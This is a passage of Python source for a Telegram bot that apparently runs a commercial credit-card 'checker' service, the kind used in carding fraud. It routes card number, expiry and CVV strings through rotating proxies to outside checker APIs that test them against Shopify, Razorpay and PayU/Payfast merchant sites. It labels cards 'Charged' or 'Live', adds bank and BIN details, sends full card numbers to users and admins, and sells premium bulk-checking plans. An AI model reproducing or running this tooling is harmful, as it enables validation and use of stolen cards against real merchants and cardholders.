    t += f"💡 𝗠𝗮𝗱𝗲 𝗯𝘆: @its_chirag_real\n"
    t += f"👑 𝗦𝘂𝗽𝗽𝗼𝗿𝘁: @its_chirag_real"
    return t

async def save_user_stats(uid, was_successful=False):
    uf = f"user_{uid}.json"
    ud = {}
    if os.path.exists(uf):
        try:
            with open(uf, 'r', encoding='utf-8') as f: ud = json.load(f)
        except: pass
    ud['total_checks'] = ud.get('total_checks', 0) + 1
    if was_successful: ud['successful_checks'] = ud.get('successful_checks', 0) + 1
    try:
        with open(uf, 'w', encoding='utf-8') as f: json.dump(ud, f, indent=2)
    except: pass

async def create_user_if_not_exists(uid, uname):
    if is_banned(uid): return
    uf = f"user_{uid}.json"
    if not os.path.exists(uf):
        ud = {'user_id': uid, 'username': uname, 'registered_at': datetime.now().isoformat(),
              'total_checks': 0, 'successful_checks': 0, 'plan': 'free', 'plan_expiry': None,
              'daily_checks': 0, 'last_check_date': datetime.now().date().isoformat(),
              'last_check_time': None}
        try:
            with open(uf, 'w', encoding='utf-8') as f: json.dump(ud, f, indent=2)
            await send_log('start', uid, uname, 'New user registered!')
        except: pass

# ---------- BIN INFO ----------
async def get_bin_info(cn):
    try:
        b = cn[:6]
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{b}') as r:
                if r.status != 200: return '-', '-', '-', '-', '-', ''
                d = json.loads(await r.text())
                return (d.get('brand', '-'), d.get('type', '-'), d.get('level', '-'),
                        d.get('bank', '-'), d.get('country_name', '-'), d.get('country_flag', ''))
    except: return '-', '-', '-', '-', '-', ''

# ---------- CHECK FUNCTIONS ----------
async def check_card(card, site, proxy, api_urls=None):
    if api_urls is None: api_urls = CHECKER_API_URLS
    le = None
    for url in api_urls:
        try:
            p = card.split('|')
            if len(p) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
            if 'payu' in url or 'payfast' in url:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
                    async with s.get(f"{url}{card}") as r: raw = await r.json(content_type=None)
            else:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
                    async with s.get(url, params={'cc': card, 'site': site, 'proxy': proxy}) as r:
                        raw = await r.json(content_type=None)
            rm = raw.get('Response', '')
            pr = raw.get('Price', '-')
            gw = raw.get('Gateway', 'shopiii')
            st = raw.get('Status', False)
            if is_dead_indicator(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_fraud_or_declined(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_charged_response(rm) or st is True: return {'status': 'Charged', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_approved_response(rm): return {'status': 'Approved', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if any(x in rm.lower() for x in _DEAD_INDICATORS):
                le = rm; continue
            return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
        except asyncio.TimeoutError: le = 'Timeout'; continue
        except Exception as e:
            em = str(e)
            if is_dead_indicator(em) or is_fraud_or_declined(em):
                return {'status': 'Dead', 'message': em, 'card': card, 'gateway': 'Unknown', 'price': '-', 'raw_response': None}
            le = em; continue
    return {'status': 'Dead', 'message': f'All APIs failed: {le}', 'card': card, 'gateway': 'Unknown', 'price': '-', 'raw_response': None}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites: return {'status': 'Dead', 'message': 'No sites', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies: return {'status': 'Dead', 'message': 'No proxies', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    lr = None
    for _ in range(max_retries):
        r = await check_card(card, random.choice(sites), random.choice(proxies))
        if r.get('status') in ['Charged', 'Approved', 'Dead', 'Invalid Format']: return r
        lr = r
        await asyncio.sleep(0.3)
    return lr or {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_payu(card, api_urls=None):
    if api_urls is None:
        api_urls = [u for u in CHECKER_API_URLS if 'payu' in u.lower() or 'payfast' in u.lower()]
    if not api_urls: return {'status': 'Dead', 'message': 'No PayU API', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    le = None
    for url in api_urls:
        try:
            p = card.split('|')
            if len(p) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
                async with s.get(f"{url}{card}") as r: raw = await r.json(content_type=None)
            rm = raw.get('Response', '')
            pr = raw.get('Price', '-')
            gw = raw.get('Gateway', 'payfast')
            st = raw.get('Status', False)
            if is_dead_indicator(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_fraud_or_declined(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_charged_response(rm) or st is True: return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_approved_response(rm): return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gw, 'price': pr, 'raw_response': raw}
            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gw, 'price': pr, 'raw_response': raw}
        except asyncio.TimeoutError: le = 'Timeout'; continue
        except Exception as e: le = str(e); continue
    return {'status': 'Dead', 'message': f'All PayU failed: {le}', 'card': card, 'gateway': 'Unknown', 'price': '-', 'raw_response': None}

async def check_card_shopify(card, site, proxy, api_urls=None):
    if api_urls is None: api_urls = [u for u in CHECKER_API_URLS if 'shopify' in u.lower()]
    if not api_urls: return {'status': 'Dead', 'message': 'No Shopify API', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not site or not proxy: return {'status': 'Dead', 'message': 'Site+proxy required', 'card': card, 'gateway': 'shopify', 'price': '-'}
    le = None
    for url in api_urls:
        try:
            p = card.split('|')
            if len(p) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
                async with s.get(url, params={'cc': card, 'site': site, 'proxy': proxy}) as r:
                    raw = await r.json(content_type=None)
            rm = raw.get('Response', '')
            pr = raw.get('Price', '-')
            gw = raw.get('Gateway', 'shopify')
            st = raw.get('Status', False)
            if is_dead_indicator(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_fraud_or_declined(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_charged_response(rm) or st is True: return {'status': 'Charged', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_approved_response(rm): return {'status': 'Approved', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            return {'status': 'Dead', 'message': rm, 'card': card, 'site': site, 'gateway': gw, 'price': pr, 'raw_response': raw}
        except asyncio.TimeoutError: le = 'Timeout'; continue
        except Exception as e: le = str(e); continue
    return {'status': 'Dead', 'message': f'All Shopify failed: {le}', 'card': card, 'gateway': 'Unknown', 'price': '-', 'raw_response': None}

async def check_card_shopify_with_retry(card, sites, proxies, max_retries=2):
    if not sites: return {'status': 'Dead', 'message': 'No sites', 'card': card, 'gateway': 'shopify', 'price': '-'}
    if not proxies: return {'status': 'Dead', 'message': 'No proxies', 'card': card, 'gateway': 'shopify', 'price': '-'}
    lr = None
    for _ in range(max_retries):
        r = await check_card_shopify(card, random.choice(sites), random.choice(proxies))
        if r.get('status') in ['Charged', 'Approved']: return r
        lr = r
        await asyncio.sleep(0.3)
    return lr or {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': 'shopify', 'price': '-'}

# ---------- RAZORPAY (uses razorpay sites + proxies) ----------
async def check_card_razorpay(card, razorpay_site, proxy, api_urls=None):
    if api_urls is None:
        api_urls = [u for u in CHECKER_API_URLS if 'razorpay' in u.lower() or 'rxl' in u.lower()]
    if not api_urls: return {'status': 'Dead', 'message': 'No Razorpay API', 'card': card, 'gateway': 'razorpay', 'price': '-'}
    le = None
    for url in api_urls:
        try:
            p = card.split('|')
            if len(p) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
                async with s.get(url, params={'cc': card, 'site': razorpay_site, 'proxy': proxy}) as r:
                    raw = await r.json(content_type=None)
            rm = raw.get('Response', '')
            pr = raw.get('Price', '-')
            gw = raw.get('Gateway', 'razorpay')
            st = raw.get('Status', False)
            if is_dead_indicator(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': razorpay_site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_fraud_or_declined(rm): return {'status': 'Dead', 'message': rm, 'card': card, 'site': razorpay_site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_charged_response(rm) or st is True: return {'status': 'Charged', 'message': rm, 'card': card, 'site': razorpay_site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            if is_approved_response(rm): return {'status': 'Approved', 'message': rm, 'card': card, 'site': razorpay_site, 'gateway': gw, 'price': pr, 'raw_response': raw}
            return {'status': 'Dead', 'message': rm, 'card': card, 'site': razorpay_site, 'gateway': gw, 'price': pr, 'raw_response': raw}
        except asyncio.TimeoutError: le = 'Timeout'; continue
        except Exception as e: le = str(e); continue
    return {'status': 'Dead', 'message': f'All Razorpay failed: {le}', 'card': card, 'gateway': 'razorpay', 'price': '-', 'raw_response': None}

async def check_card_razorpay_with_retry(card, rz_sites, proxies, max_retries=2):
    if not rz_sites: return {'status': 'Dead', 'message': 'No Razorpay sites', 'card': card, 'gateway': 'razorpay', 'price': '-'}
    if not proxies: return {'status': 'Dead', 'message': 'No proxies', 'card': card, 'gateway': 'razorpay', 'price': '-'}
    lr = None
    for _ in range(max_retries):
        r = await check_card_razorpay(card, random.choice(rz_sites), random.choice(proxies))
        if r.get('status') in ['Charged', 'Approved']: return r
        lr = r
        await asyncio.sleep(0.3)
    return lr or {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': 'razorpay', 'price': '-'}

# ---------- TEST HELPERS ----------
async def test_site(site, proxy):
    tc = "5154623245618097|03|2032|156"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            async with s.get(CHECKER_API_URLS[1], params={'cc': tc, 'site': site, 'proxy': proxy}) as r:
                raw = await r.json(content_type=None)
        rm = raw.get('Response', '').lower()
        st = raw.get('Status', False)
        if st is True or 'order placed' in rm or 'order_completed' in rm:
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead'}
    except: return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    tc = "5154623245618097|03|2032|156"
    ts = "brewcitybrand.myshopify.com"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            async with s.get(CHECKER_API_URLS[1], params={'cc': tc, 'site': ts, 'proxy': proxy}) as r:
                raw = await r.json(content_type=None)
        rm = raw.get('Response', '').lower()
        if 'proxy dead' in rm or 'invalid proxy format' in rm or 'no proxy' in rm:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except: return {'proxy': proxy, 'status': 'dead'}

async def check_api_health(url):
    tc = "5154623245618097|03|2032|156"
    ts = "brewcitybrand.myshopify.com"
    tp = "192.168.1.1:8080"
    try:
        if 'payu' in url or 'payfast' in url:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
                async with s.get(f"{url}{tc}") as r: return r.status == 200
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(url, params={'cc': tc, 'site': ts, 'proxy': tp}) as r: return r.status == 200
    except: return False

# ---------- HIT SENDING ----------
async def send_realtime_hit(uid, result, hit_type, uname):
    if hit_type == 'Charged': em, st = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif hit_type == 'Approved':
        ml = result['message'].lower()
        if 'insufficient' in ml or 'approved' in ml: em, st = "🔥", "𝐋𝐢𝐯𝐞"
        else: return
    else: return
    brand, bt, lv, bk, cn, fl = await get_bin_info(result['card'].split('|')[0])
    cd = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    um = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{em} Status: {st}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡: {brand} - {bt} - {lv}
𝗕𝗮𝗻𝗸: {bk}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {cn} {fl}</pre>
<b>👑 Support:</b> @its_chirag_real"""
    try: await bot.send_message(uid, premium_emoji(um), parse_mode='html')
    except: pass
    if hit_type == 'Charged':
        mc = mask_card(result['card'])
        cm = f"""<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{em} Status: {st}</blockquote>
<blockquote>💳 Card: <code>{mc}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡: {brand} - {bt} - {lv}
𝗕𝗮𝗻𝗸: {bk}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {cn} {fl}</pre>
<b>👤 User:</b> <code>{uid}</code> (@{uname if uname else 'N/A'})
<b>📅 Time:</b> {cd}
<b>👑 Support:</b> @its_chirag_real"""
        try: await bot.send_message(HIT_CHANNEL_ID, premium_emoji(cm), parse_mode='html')
        except: pass
        am = f"""<b>🔔 CHARGED - ADMIN</b>

<b>💳 Card:</b> <code>{result['card']}</code>
<b>📝 Response:</b> {result['message'][:150]}
<b>🌐 Gateway:</b> {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}
<b>👤 User:</b> <code>{uid}</code> (@{uname if uname else 'N/A'})
<b>📅 Time:</b> {cd}

<b>💠 BIN:</b>
<pre>Brand: {brand}
Type: {bt}
Level: {lv}
Bank: {bk}
Country: {cn} {fl}</pre>

<b>👑 Support:</b> @its_chirag_real"""
        for aid in ADMIN_IDS:
            if aid != uid:
                try: await bot.send_message(aid, premium_emoji(am), parse_mode='html')
                except: pass
    mc = mask_card(result['card'])
    await send_log('hit', uid, uname, f'Card: {mc}... Status: {st}',
                   {'Card': mc, 'Status': st, 'Gateway': result.get('gateway', 'Unknown'),
                    'Price': result.get('price', '-')})

# ---------- INVOICE ----------
async def send_premium_invoice_to_user(uid, uname, plan, pd, dd, exp, code, inv):
    try:
        ct = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        ef = exp[:10] if exp else 'N/A'
        m = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>🎟️ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐈𝐍𝐕𝐎𝐈𝐂𝐄 🎟️</b>
<b>━━━━━━━━━━━━━━━━━</b>

<blockquote>🧾 <b>Invoice:</b> <code>{inv}</code></blockquote>
<blockquote>🆔 <b>User ID:</b> <code>{uid}</code></blockquote>
<blockquote>👤 <b>Username:</b> @{uname if uname else 'N/A'}</blockquote>
<blockquote>📅 <b>Date:</b> {ct}</blockquote>

<b>━━━━━━━━━━━━━━━━━</b>
<b>💎 𝐏𝐋𝐀𝐍 💎</b>
<b>━━━━━━━━━━━━━━━━━</b>

<blockquote>🎁 <b>Plan:</b> {pd}</blockquote>
<blockquote>⏳ <b>Duration:</b> {dd} Days</blockquote>
<blockquote>📅 <b>Expires:</b> {ef}</blockquote>
<blockquote>💠 <b>Status:</b> ✅ Activated</blockquote>
<blockquote>🎟️ <b>Code:</b> <code>{code}</code></blockquote>

<b>━━━━━━━━━━━━━━━━━</b>
<b>🥰 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂!</b>
<b>👑 Support:</b> @its_chirag_real
<b>━━━━━━━━━━━━━━━━━</b>"""
        await bot.send_message(uid, premium_emoji(m), parse_mode='html')
    except: pass

async def send_premium_invoice_to_admins(uid, uname, plan, pd, dd, exp, code, inv, fn="User"):
    try:
        ct = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        ef = exp[:10] if exp else 'N/A'
        m = f"""<b>🔔 𝐀𝐃𝐌𝐈𝐍 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 🔔</b>
<b>🎟️ NEW PREMIUM 🎟️</b>
<b>━━━━━━━━━━━━━━━━━</b>

<blockquote>🧾 <b>Invoice:</b> <code>{inv}</code></blockquote>
<blockquote>📅 <b>At:</b> {ct}</blockquote>
<blockquote>🆔 <b>User:</b> <code>{uid}</code></blockquote>
<blockquote>👤 <b>Name:</b> {fn}</blockquote>
<blockquote>📝 <b>Username:</b> @{uname if uname else 'N/A'}</blockquote>
<blockquote>🎁 <b>Plan:</b> {pd}</blockquote>
<blockquote>⏳ <b>Duration:</b> {dd} Days</blockquote>
<blockquote>📅 <b>Expires:</b> {ef}</blockquote>
<blockquote>🎟️ <b>Code:</b> <code>{code}</code></blockquote>
<b>👑 Support:</b> @its_chirag_real"""
        for aid in ADMIN_IDS:
            try: await bot.send_message(aid, premium_emoji(m), parse_mode='html')
            except: pass
        try: await bot.send_message(LOG_CHANNEL_ID, premium_emoji(m), parse_mode='html')
        except: pass
    except: pass

async def send_thank_you_message(uid, uname, pd):
    try:
        m = f"""<b>🎉 𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔! 🎉</b>

<blockquote>🥰 Thank you @{uname if uname else 'user'}!</blockquote>
<blockquote>💎 Your <b>{pd}</b> is active.</blockquote>
<blockquote>🚀 Enjoy unlimited checking!</blockquote>

<b>💡 𝐐𝐮𝐢𝐜𝐤 𝐒𝐭𝐚𝐫𝐭:</b>
<blockquote>├ <code>/cc card|mm|yy|cvv</code></blockquote>
<blockquote>├ <code>/chk</code> - Mass (reply .txt)</blockquote>
<blockquote>├ <code>/auto</code> - Auto (reply .txt)</blockquote>
<blockquote>└ <code>/help</code> - All commands</blockquote>
<b>👑 Support:</b> @its_chirag_real"""
        await bot.send_message(uid, premium_emoji(m), parse_mode='html')
    except: pass

async def send_feedback_log(uid, uname, txt, pp=None):
    try:
        ct = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        m = f"""<b>📝 FEEDBACK</b>
<blockquote>👤 User: <code>{uid}</code></blockquote>
<blockquote>📝 Username: @{uname if uname else 'N/A'}</blockquote>
<blockquote>📅 Time: {ct}</blockquote>
<blockquote>📋 Feedback: {txt}</blockquote>
<b>👑 Support:</b> @its_chirag_real"""
        if pp and os.path.exists(pp):
            await bot.send_file(LOG_CHANNEL_ID, pp, caption=premium_emoji(m), parse_mode='html')
        else:
            await bot.send_message(LOG_CHANNEL_ID, premium_emoji(m), parse_mode='html')
        for aid in ADMIN_IDS:
            try:
                if pp and os.path.exists(pp):
                    await bot.send_file(aid, pp, caption=premium_emoji(m), parse_mode='html')
                else:
                    await bot.send_message(aid, premium_emoji(m), parse_mode='html')
            except: pass
    except Exception as e: print(f"FB log err: {e}")

# ---------- PROGRESS & FINALS ----------
async def update_progress(uid, mid, results, checked):
    e = int(time.time() - results['start_time'])
    h, m, s = e // 3600, (e % 3600) // 60, e % 60
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    t = f"""
<b>💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {checked}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>👑 Support:</b> @its_chirag_real"""
    btns = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
            [Button.inline("🛑 Stop", b"stop")]]
    try: await bot.edit_message(uid, mid, premium_emoji(t), buttons=btns, parse_mode='html')
    except: pass

async def send_final_results(uid, results):
    e = int(time.time() - results['start_time'])
    h, m, s = e // 3600, (e % 3600) // 60, e % 60
    ht = ""
    for r in results['charged'][:5]: ht += f"✅ <code>{r['card']}</code>\n"
    for r in results['approved'][:5]: ht += f"🔥 <code>{r['card']}</code>\n"
    if not ht: ht = "No hits"
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    sm = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{ht}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>👑 Support:</b> @its_chirag_real"""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"results_{uid}_{ts}.txt"
    async with aiofiles.open(fn, 'w') as f:
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write(f"\n🔥 APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    await bot.send_message(uid, premium_emoji(sm), file=fn, parse_mode='html')
    try: os.remove(fn)
    except: pass

async def update_payu_progress(uid, mid, results, checked):
    e = int(time.time() - results['start_time'])
    h, m, s = e // 3600, (e % 3600) // 60, e % 60
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'payfast')
    t = f"""
<b>💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {checked}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>👑 Support:</b> @its_chirag_real"""
    btns = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
            [Button.inline("🛑 Stop", b"stop")]]
    try: await bot.edit_message(uid, mid, premium_emoji(t), buttons=btns, parse_mode='html')
    except: pass

async def send_payu_final_results(uid, results):
    e = int(time.time() - results['start_time'])
    h, m, s = e // 3600, (e % 3600) // 60, e % 60
    ht = ""
    for r in results['charged'][:5]: ht += f"✅ <code>{r['card']}</code>\n"
    for r in results['approved'][:5]: ht += f"🔥 <code>{r['card']}</code>\n"
    if not ht: ht = "No hits"
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'payfast')
    sm = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{ht}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>👑 Support:</b> @its_chirag_real"""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"results_{uid}_{ts}.txt"
    async with aiofiles.open(fn, 'w') as f:
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write(f"\n🔥 APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', '?')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    await bot.send_message(uid, premium_emoji(sm), file=fn, parse_mode='html')
    try: os.remove(fn)
    except: pass

# ---------- INIT BOT ----------
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ---------- ADMIN PANEL ----------
def get_admin_keyboard(page=1):
    if page == 1:
        return [
            [Button.inline("➕ Add Premium", b"admin_addprem")],
            [Button.inline("➖ Remove Premium", b"admin_removeprem")],
            [Button.inline("📋 List Premium", b"admin_listprem")],
            [Button.inline("🔑 Generate Code", b"admin_gencode")],
            [Button.inline("📨 Mass Codes", b"admin_masscodes")],
            [Button.inline("📊 API Status", b"admin_apistatus")],
            [Button.inline("📢 Broadcast", b"admin_broadcast")],
            [Button.inline("👥 User List", b"admin_users")],
            [Button.inline("ℹ️ User Info", b"admin_userinfo")],
            [Button.inline("🔄 Reset Stats", b"admin_resetstats")],
            [Button.inline("➡️ Next Page", b"admin_page2")],
            [Button.inline("🔙 Back to Main", b"main_menu")]
        ]
    elif page == 2:
        return [
            [Button.inline("➕ Add Site", b"admin_addsite")],
            [Button.inline("➖ Remove Site", b"admin_rmsite")],
            [Button.inline("➕ Add Proxy", b"admin_addproxy")],
            [Button.inline("➖ Remove Proxy", b"admin_rmproxy")],
            [Button.inline("📋 View Codes", b"admin_codes")],
            [Button.inline("📊 System Stats", b"admin_sysstats")],
            [Button.inline("⬅️ Previous Page", b"admin_page1")],
            [Button.inline("➡️ Next Page", b"admin_page3")],
            [Button.inline("🔙 Back to Main", b"main_menu")]
        ]
    else:
        return [
            [Button.inline("🏆 Top Users", b"admin_topusers")],
            [Button.inline("🕒 Last Check", b"admin_lastcheck")],
            [Button.inline("📝 Set Plan", b"admin_setplan")],
            [Button.inline("🗑️ Delete User", b"admin_deleteuser")],
            [Button.inline("🚫 Ban User", b"admin_banuser")],
            [Button.inline("✅ Unban User", b"admin_unbanuser")],
            [Button.inline("📋 Banned List", b"admin_bannedlist")],
            [Button.inline("🔧 Maintenance", b"admin_maintenance")],
            [Button.inline("📊 Active Sessions", b"admin_activesessions")],
            [Button.inline("🛑 Stop All", b"admin_stopall")],
            [Button.inline("📈 Today Stats", b"admin_todaysstats")],
            [Button.inline("📥 Export CSV", b"admin_exportcsv")],
            [Button.inline("📤 Import Sites", b"admin_importsites")],
            [Button.inline("📤 Import Proxies", b"admin_importproxies")],
            [Button.inline("🧹 Clear Sites", b"admin_clearsites")],
            [Button.inline("🧹 Clear Proxies", b"admin_clearproxies")],
            [Button.inline("🔄 API Order", b"admin_apiorder")],
            [Button.inline("➕ Add API", b"admin_addapi")],
            [Button.inline("➖ Remove API", b"admin_removeapi")],
            [Button.inline("🔄 Reload Config", b"admin_reload")],
            [Button.inline("📝 Feedback", b"admin_feedback")],
            [Button.inline("⬅️ Previous Page", b"admin_page2")],
            [Button.inline("🔙 Back to Main", b"main_menu")]
        ]

# ---------- /start ----------
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid):
        await event.reply(premium_emoji("🚫 <b>You are banned.</b>"), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid):
        await event.reply(premium_emoji("🔧 <b>Maintenance mode.</b>"), parse_mode='html'); return
    if not await is_user_joined(uid):
        await send_force_join_message(event); return
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
    except: un = f"user_{uid}"
    await create_user_if_not_exists(uid, un)
    await send_log('start', uid, un, 'User started bot')
    st = await get_user_stats_text(uid, un, cid)
    wt = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 CHIRAG 𝗯𝗼𝘁, @{un}!\n\n{st}"
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(premium_emoji(wt), file=WELCOME_IMAGE_PATH, buttons=get_main_menu_keyboard(), parse_mode='html')
    else:
